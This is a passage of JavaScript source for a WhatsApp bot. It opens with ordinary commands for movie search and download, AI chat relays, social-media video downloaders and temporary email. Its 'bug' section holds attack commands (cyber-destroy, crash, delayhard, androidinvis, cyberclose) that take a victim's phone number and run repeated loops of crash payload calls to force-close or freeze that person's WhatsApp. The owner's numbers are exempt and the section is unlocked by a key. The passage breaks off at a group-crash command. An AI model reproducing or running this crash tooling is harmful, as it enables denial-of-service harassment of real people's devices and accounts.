        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case 'selectmovie': {
    if (!text) return reply(`🎬 *Usage:* selectmovie [number]`);
    
    const userSession = userMovieSessions[m.sender];
    if (!userSession || !userSession.movies || userSession.movies.length === 0) {
        return reply(`❌ *No movies found. Use .movie command first*`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= userSession.movies.length) {
        return reply(`❌ *Invalid number* • Choose 1-${userSession.movies.length}`);
    }

    const selectedMovie = userSession.movies[selectedIndex];
    const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        await reply(`🔍 *Fetching details for "${selectedMovie.title}"...*`);
        
        const response = await axios.get(movieDetailsUrl);
        const { status, result } = response.data;

        if (!status || !result) return reply(`❌ *Failed to fetch details*`);

        const movie = result.data;
        
        // Store download links for THIS USER
        userSession.selectedMovie = {
            title: movie.title,
            links: movie.dl_links || []
        };

        let movieInfo = `🎬 *${movie.title}*\n\n` +
            `📅 ${movie.date || 'N/A'}\n` +
            `🌍 ${movie.country || 'N/A'}\n` +
            `⏳ ${movie.runtime || 'N/A'}\n` +
            `⭐ ${movie.imdbRate || 'N/A'}/10\n\n` +
            `📥 *Available Qualities*\n`;

        if (movie.dl_links && movie.dl_links.length > 0) {
            movie.dl_links.forEach((link, index) => {
                movieInfo += `${index + 1}. ${link.quality || 'Unknown'} - ${link.size || 'N/A'}\n`;
            });
            movieInfo += `\n📌 *Download:* .dlmovie [number]`;
        } else {
            movieInfo += `No download links available`;
        }

        // Send poster if available
        if (movie.image) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    image: { url: movie.image },
                    caption: movieInfo
                }),
                { quoted: m }
            );
        } else {
            await reply(movieInfo);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Movie details error:', error);
        reply(`❌ *Failed to fetch movie details*`);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;

case 'dlmovie': {
    if (!text) return reply(`📥 *Usage:* dlmovie [number]`);
    
    const userSession = userMovieSessions[m.sender];
    if (!userSession || !userSession.selectedMovie || !userSession.selectedMovie.links) {
        return reply(`❌ *No movie selected. Use .selectmovie first*`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= userSession.selectedMovie.links.length) {
        return reply(`❌ *Invalid number* • Choose 1-${userSession.selectedMovie.links.length}`);
    }

    const selectedLink = userSession.selectedMovie.links[selectedIndex]?.link;
    if (!selectedLink) return reply(`❌ *Download link not found*`);

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        await reply(`⏳ *Downloading "${userSession.selectedMovie.title}"...*\nQuality: ${selectedLink.quality || 'Unknown'}\nSize: ${selectedLink.size || 'Unknown'}`);

        // Send as document
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: { url: selectedLink },
                mimetype: 'video/mp4',
                fileName: `${userSession.selectedMovie.title}.mp4`,
                caption: `🎬 *${userSession.selectedMovie.title}*`
            }),
            { quoted: m }
        );
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Movie download error:', error);
        reply(`❌ *Download failed* • Try again later`);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
}
break;
// =========================================

case 'deepseek':
case 'deepsjfkeek': {
    if (!text) return reply("🤖 *Usage:* .deepseek your question");
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        const sysPromptDS = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
        const resDS = await axios.post('https://text.pollinations.ai/', {
            messages: [
                { role: 'system', content: sysPromptDS },
                { role: 'user', content: text }
            ],
            model: 'deepseek',
            seed: -1
        }, { timeout: 40000 });
        const answerDS = typeof resDS.data === 'string' ? resDS.data : JSON.stringify(resDS.data);
        if (!answerDS || answerDS.startsWith('<')) return reply("⚠️ *DeepSeek did not respond* — try again");
        const chunksDS = answerDS.match(/[\s\S]{1,3000}/g) || [answerDS];
        for (let i = 0; i < chunksDS.length; i++) {
            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *DeepSeek*\n\n" : "") + chunksDS[i] }, i === 0 ? { quoted: m } : {});
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (error) {
        console.error('DeepSeek error:', error.message);
        reply(`❌ *DeepSeek error* • Try later`);
    }
    break;
}

case 'grok':
case "grovnnk-ai": {
    let query = text || (m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.conversation);
    if (!query) return reply("🤖 *Usage:* .grok your question");
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        const sysPromptGrok = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
        const resGrok = await axios.post('https://text.pollinations.ai/', {
            messages: [
                { role: 'system', content: sysPromptGrok },
                { role: 'user', content: query }
            ],
            model: 'llama',
            seed: -1
        }, { timeout: 40000 });
        const answerGrok = typeof resGrok.data === 'string' ? resGrok.data : JSON.stringify(resGrok.data);
        if (!answerGrok || answerGrok.startsWith('<')) return reply("⚠️ *Grok did not respond* — try again");
        const chunksGrok = answerGrok.match(/[\s\S]{1,3000}/g) || [answerGrok];
        for (let i = 0; i < chunksGrok.length; i++) {
            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *Grok*\n\n" : "") + chunksGrok[i] }, i === 0 ? { quoted: m } : {});
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error('Grok error:', err.message);
        reply("⚠️ *Grok unavailable* • Try again later");
    }
}
break;

case 'stupidcheck': case 'uncleancheck': case 'hotcheck': case 'smartcheck': 
case 'greatcheck': case 'evilcheck': case 'dogcheck': case 'coolcheck': 
case 'gaycheck': case 'waifucheck': {
    const okebnh1 = Array.from({length: 100}, (_, i) => (i + 1).toString());
    const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)];
    
    const msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: xeonkak + "%"
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'CYBER'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: devtrust.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"✅\",\"id\":\"\"}`
                        }],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: NEWSLETTER_NAME,
                            serverMessageId: -1
                        }
                    }
                })
            }
        }
    }, { quoted: m });
    
    return await devtrust.relayMessage(m.chat, msgs.message, {});
}
break;

case "metabcn-ai": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* meta your question");

        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from Meta AI*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *Meta AI*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Meta AI unavailable*");
    }
}
break;

case 'qwen':
case "qwenxj": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* qwen your question");

        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from Qwen*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *Qwen*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Qwen unavailable*");
    }
}
break;

case 'fb':
case 'fbdl':
case 'facebook': {
    const fbInput = m.message?.conversation || m.message?.extendedTextMessage?.text;
    const fbUrl = fbInput?.split(' ')?.slice(1)?.join(' ')?.trim();

    if (!fbUrl) return reply("🔗 *Provide a Facebook video URL*\n\nExample: `.fb https://facebook.com/reel/...`");
    if (!fbUrl.includes('facebook.com')) return reply("❌ *Invalid Facebook link*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const fbRes = await axios.get(`https://api.princetechn.com/api/download/facebook?apikey=prince&url=${encodeURIComponent(fbUrl)}`);
        const fbData = fbRes.data;

        if (!fbData || fbData.status !== 200 || !fbData.result) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *Failed to fetch Facebook video*");
        }

        const fbResult = fbData.result;
        const fbVidUrl = fbResult.hd_video || fbResult.sd_video;
        if (!fbVidUrl) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *No downloadable video found*");
        }

        const fbCaption = `📹 *Facebook Video*\n${fbResult.title ? `\n📌 ${fbResult.title}` : ''}${fbResult.duration ? `\n⏱️ Duration: ${fbResult.duration}` : ''}`;

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: fbVidUrl },
                mimetype: "video/mp4",
                caption: fbCaption
            }),
            { quoted: m }
        );
    } catch (error) {
        console.error('[FB DL]', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Facebook download failed. Please try again.*");
    }
    break;
}

case 'twitter':
case 'twit':
case 'twitterdl':
case 'xdl': {
    const twUrl = text?.trim();
    if (!twUrl) return reply("🔗 *Provide a Twitter/X video URL*\n\nExample: `.twitter https://twitter.com/user/status/...`");
    if (!twUrl.includes('twitter.com') && !twUrl.includes('x.com')) return reply("❌ *Invalid Twitter/X link*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const twRes = await axios.get(`https://api.princetechn.com/api/download/twitter?apikey=prince&url=${encodeURIComponent(twUrl)}`);
        const twData = twRes.data;

        if (!twData || twData.status !== 200 || !twData.result) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *Failed to fetch Twitter/X video*");
        }

        const twResult = twData.result;
        const twVideos = twResult.videoUrls;
        if (!twVideos || twVideos.length === 0) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *No downloadable video found in this tweet*");
        }

        const bestVideo = twVideos[0];
        const twCaption = `🐦 *Twitter/X Video*\n\n📊 Quality: ${bestVideo.quality}`;

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: bestVideo.url },
                mimetype: "video/mp4",
                caption: twCaption
            }),
            { quoted: m }
        );
    } catch (error) {
        console.error('[TWITTER DL]', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Twitter download failed. Please try again.*");
    }
    break;
}

case 'igdl':
case 'instagram':
case 'ig': {
    const igUrl = text?.trim();
    if (!igUrl) return reply("🔗 *Provide an Instagram link*\n\nExample: `.ig https://www.instagram.com/reel/...`");
    if (!igUrl.includes('instagram.com')) return reply("❌ *Invalid Instagram link*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const igResult = await igDownload(igUrl);
        const { caption, medias } = igResult;

        if (!medias || medias.length === 0) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply("❌ *No downloadable media found in this post*");
        }

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        // Send all media (supports single post, reel, and carousel)
        for (let i = 0; i < medias.length; i++) {
            const media = medias[i];
            const isLast = i === medias.length - 1;
            const mediaCaption = isLast && caption
                ? `📸 *Instagram*\n\n${caption.slice(0, 500)}`
                : (medias.length === 1 ? (media.type === 'video' ? "📹 *Instagram Video*" : "📸 *Instagram Image*") : '');

            try {
                if (media.type === 'video') {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            video: { url: media.url },
                            mimetype: 'video/mp4',
                            caption: mediaCaption
                        }),
                        { quoted: m }
                    );
                } else {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: media.url },
                            caption: mediaCaption
                        }),
                        { quoted: m }
                    );
                }
            } catch (sendErr) {
                console.error('[IG DL] send error for item', i, sendErr.message);
            }

            // Small delay between carousel items to avoid flood
            if (i < medias.length - 1) await new Promise(r => setTimeout(r, 800));
        }
    } catch (err) {
        console.error('[IG DL]', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Instagram download failed. Please try again.*");
    }
    break;
}

// ============ TEMP MAIL COMMANDS ============
case "tempmail":
case "tmpmail":
case "newmail": {
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📧', key: m.key } });
        
        // Generate new email
        const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
        const email = response.data[0];

        if (!email) return reply("❌ *Failed to generate email*");

        // Store email for this user
        tempMailData[m.sender] = { 
            email: email,
            login: email.split('@')[0],
            domain: email.split('@')[1],
            createdAt: Date.now()
        };

        const message = `📧 *Temporary Email Created*\n\n` +
            `📨 ${email}\n\n` +
            `📌 *Commands:*\n` +
            `• checkmail - Check inbox\n` +
            `• readmail [id] - Read specific email\n` +
            `• delmail - Delete current email\n\n` +
            `_Email expires in 24 hours_`;

        reply(message);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Temp mail error:', error);
        reply("❌ *Error creating temporary email*");
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    break;
}

case "checkmail":
case "checkmails":
case "inbox": {
    const userMail = tempMailData[m.sender];
    if (!userMail || !userMail.email) {
        return reply("❌ *No email found. Use `tempmail` first*");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📬', key: m.key } });
        
        const response = await axios.get(
            `https://www.1secmail.com/api/v1/?action=getMessages&login=${userMail.login}&domain=${userMail.domain}`
        );
        
        const messages = response.data;
        
        if (!messages || messages.length === 0) {
            return reply(`📭 *Inbox Empty*\n\nYour inbox for ${userMail.email} has no messages.`);
        }

        let inboxText = `📬 *Inbox - ${userMail.email}*\n\n`;
        inboxText += `Found ${messages.length} message(s):\n\n`;

        messages.forEach((msg, index) => {
            inboxText += `${index + 1}. 📧 *From:* ${msg.from}\n`;
            inboxText += `   📅 *Date:* ${msg.date}\n`;
            inboxText += `   📝 *Subject:* ${msg.subject}\n`;
            inboxText += `   🆔 *ID:* ${msg.id}\n\n`;
        });

        inboxText += `_Use "readmail [id]" to read a message_`;
        
        // Store messages for this user
        tempMailData[m.sender].messages = messages;
        
        reply(inboxText);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Check mail error:', error);
        reply("❌ *Error checking inbox*");
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    break;
}

case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail || !userMail.email) {
        return reply("❌ *No email found. Use `tempmail` first*");
    }

    const messageId = args[0];
    if (!messageId) {
        return reply("❌ *Please provide a message ID*\nExample: readmail 123456");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📖', key: m.key } });
        
        const response = await axios.get(
            `https://www.1secmail.com/api/v1/?action=readMessage&login=${userMail.login}&domain=${userMail.domain}&id=${messageId}`
        );
        
        const message = response.data;
        
        if (!message || !message.id) {
            return reply(`❌ *Message with ID ${messageId} not found*`);
        }

        let messageText = `📧 *Email Details*\n\n`;
        messageText += `*From:* ${message.from}\n`;
        messageText += `*Date:* ${message.date}\n`;
        messageText += `*Subject:* ${message.subject}\n\n`;
        
        if (message.textBody) {
            messageText += `*Content:*\n${message.textBody.substring(0, 1000)}`;
            if (message.textBody.length > 1000) messageText += `...\n\n_(Message truncated)_`;
        } else if (message.htmlBody) {
            messageText += `*Content:* [HTML Content - Cannot display]`;
        } else {
            messageText += `*Content:* No text content`;
        }

        // Check for attachments
        if (message.attachments && message.attachments.length > 0) {
            messageText += `\n\n*Attachments:* ${message.attachments.length}`;
        }

        reply(messageText);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Read mail error:', error);
        reply("❌ *Error reading message*");
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    break;
}

case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    if (!tempMailData[m.sender]) {
        return reply("❌ *No email to delete*");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } });
        
        const userMail = tempMailData[m.sender];
        
        // Optional: Actually delete from 1secmail
        if (userMail.login && userMail.domain) {
            await axios.get(
                `https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${userMail.login}&domain=${userMail.domain}`
            );
        }
        
        // Remove from local storage
        delete tempMailData[m.sender];
        
        reply("✅ *Temporary email deleted successfully*");
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Delete mail error:', error);
        // Still delete locally even if API fails
        delete tempMailData[m.sender];
        reply("✅ *Temporary email removed from local storage*");
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    }
    break;
}
// ============================================

case 'tempmail2': {
    try {
        const res = await axios.get(`https://apis.HansTz.my.id/temp-mail`);
        const data = res.data;

        if (!data.success) return reply(`❌ *Failed to generate*`);

        global.tempMailSession = data.session_id;

        reply(`📧 *Temp Mail*\n\n` +
            `Email: ${data.email}\n` +
            `Session: ${data.session_id}\n\n` +
            `Use *tempmail-inbox ${data.session_id}* to check`);
    } catch (err) {
        console.error(err);
        reply(`❌ *Error*`);
    }
}
break;

case 'tempmail-inbox': {
    if (!args[0]) return reply(`❌ *Provide session ID*`);

    try {
        const sessionId = args[0];
        const res = await axios.get(`https://apis.HansTz.my.id/temp-mail/inbox?id=${sessionId}`);
        const data = res.data;

        if (!data.success) return reply(`❌ *Failed to fetch inbox*`);

        if (data.messages.length === 0) return reply(`📭 *Inbox empty*`);

        let inboxText = data.messages.map((msg, i) =>
            `📧 *Message ${i + 1}*\n` +
            `From: ${msg.fromAddr}\n` +
            `To: ${msg.toAddr}\n` +
            `Text: ${msg.text ? msg.text.substring(0, 200) + '...' : 'No preview'}`
        ).join('\n\n');

        reply(`📬 *Inbox*\n\n${inboxText}`);
    } catch (err) {
        console.error(err);
        reply(`❌ *Error*`);
    }
}
break;

//==============================
// 𝗖𝗔𝗦𝗘 𝗕𝗨𝗚 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
//==============================

case 'cyber-destroy': {
    {
        const _bgN3 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB3 = (global._flagCache?.bugBanned || []);
            if (_bgB3.some(id => String(id).replace(/[^0-9]/g,'') === _bgN3)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU3 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU3.some(id => String(id).replace(/[^0-9]/g,'') === _bgN3)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    } 
    if (!q) return reply("📌 *Usage:* cyber-destroy 923xx");

    let targetNumber = q.replace(/[^0-9]/g, '');
    
    // 🔒 PROTECTED NUMBERS CHECK
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(targetNumber)) {
        return reply("🔒 *Protected*");
    }

    let target = targetNumber + "@s.whatsapp.net";
    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${targetNumber}\n🔥 *10 Round Attack Launching...*`);

    try {
        await CYBEReress();
        await sleep(30);
        for (let round = 0; round < 10; round++) {
            await Combo(target);
            await sleep(25);
            await fcnew(target);
            await sleep(25);
            await XPhone(target);
            await sleep(25);
            await BayuOfficialHard(target);
            await sleep(25);
            for (let i = 0; i < 30; i++) {
                await ForceClose(target);
                await sleep(15);
            }
            await sleep(30);
        }

        reply(`✅ *CYBER-DESTROY complete — 10 rounds done on ${targetNumber}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'error'}*`);
    }
    break;
}

case "delay":
case "crash":
case "blank":
case "cyberinvis": {
    {
        const _bgN0 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB0 = (global._flagCache?.bugBanned || []);
            if (_bgB0.some(id => String(id).replace(/[^0-9]/g,'') === _bgN0)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU0 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU0.some(id => String(id).replace(/[^0-9]/g,'') === _bgN0)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    
    // 🔒 PROTECTED NUMBERS CHECK
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }
    
    let target = pepec + '@s.whatsapp.net';
    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔥 *Launching full attack...*`);

    try {
        await CYBEReress();
        await sleep(30);
        for (let round = 0; round < 10; round++) {
            await Combo(target);
            await sleep(30);
            await fcnew(target);
            await sleep(30);
            await Combo(target);
            await sleep(30);
            await fcnew(target);
            await sleep(30);
            await XPhone(target);
            await sleep(30);
            await BayuOfficialHard(target);
            await sleep(30);
            for (let j = 0; j < 10; j++) {
                await ForceClose(target);
                await sleep(20);
            }
            await sleep(30);
        }
        reply(`✅ *Attack completed on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial execution: ${e.message || 'Error'}*`);
    }
    
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
}
break;

case "delayhard": {
    {
        const _bgN1 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB1 = (global._flagCache?.bugBanned || []);
            if (_bgB1.some(id => String(id).replace(/[^0-9]/g,'') === _bgN1)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU1 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU1.some(id => String(id).replace(/[^0-9]/g,'') === _bgN1)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    
    // 🔒 PROTECTED NUMBERS CHECK
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }
    
    let target = pepec + '@s.whatsapp.net';
    reply(`💀 *Target:* ${pepec}\n⚡ *DELAYHARD — MAXIMUM POWER*\n🔥 *Initiating full barrage...*`);

    try {
        await CYBEReress();
        await sleep(25);
        for (let round = 0; round < 10; round++) {
            await fcnew(target);
            await sleep(25);
            await fcnew(target);
            await sleep(25);
            await Combo(target);
            await sleep(25);
            await Combo(target);
            await sleep(25);
            await XPhone(target);
            await sleep(25);
            await BayuOfficialHard(target);
            await sleep(25);
            for (let i = 0; i < 15; i++) {
                await ForceClose(target);
                await sleep(15);
            }
            await sleep(25);
        }
        reply(`✅ *DELAYHARD complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    
    await devtrust.sendMessage(from, { react: { text: "😈", key: m.key } });
}
break;

case 'androidinvis':
case 'andbug':
case 'invisphone': {
    {
        const _bgN7 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB7 = (global._flagCache?.bugBanned || []);
            if (_bgB7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU7 = (global._flagCache?.bugUnlocked || []);
            if (!_bgU7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${prefix}${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");

    let target = pepec + '@s.whatsapp.net';
    reply(`🦾 *ANDROID INVISIBLE → ${pepec}*\n💣 *15x invisible null-byte crash...*`);

    try {
        for (let i = 0; i < 15; i++) {
            await callinvisible(target);
            await sleep(300);
            await blank1(target);
            await sleep(300);
            await ForceClose(target);
            await sleep(300);
            await callinvisible(target);
            await sleep(300);
        }
        reply(`✅ *Android invisible complete → ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(from, { react: { text: "🦾", key: m.key } });
}
break;

case "close-zapp":
case "bruteclose":
case "metaclose":
case "cyberclose": {
    {
        const _bgN2 = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgB2 = (global._flagCache?.bugBanned || []);
            if (_bgB2.some(id => String(id).replace(/[^0-9]/g,'') === _bgN2)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgU2 = (global._flagCache?.bugUnlocked || []);
                if (!_bgU2.some(id => String(id).replace(/[^0-9]/g,'') === _bgN2)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    
    // 🔒 PROTECTED NUMBERS CHECK
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }
    
    let target = pepec + '@s.whatsapp.net';
    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔒 *Force closing WhatsApp...*`);

    try {
        await CYBEReress();
        await sleep(150);
        for (let round = 0; round < 5; round++) {
            await Combo(target);
            await sleep(150);
            await fcnew(target);
            await sleep(150);
            for (let i = 0; i < 50; i++) {
                await ForceClose(target);
                await sleep(80);
            }
            await sleep(150);
            await XPhone(target);
            await sleep(150);
            await BayuOfficialHard(target);
            await sleep(150);
            for (let i = 0; i < 20; i++) {
                await ForceClose(target);
                await sleep(80);
            }
            await sleep(200);
        }
        reply(`✅ *Force close complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
}
break;

//====================[ GROUP BUG COMMANDS ]===========================//

case 'buggc':
case 'xgroup':
case 'crashgc':
case 'cyberkillgc':
case 'blankgc': {
    if (!isOwner) return reply(`🔒 *Owner only*`);
    if (!m.isGroup) return reply('👥 *Groups only*');
    
    reply(`💀 *Group destroy barrage starting...*`);
    try {
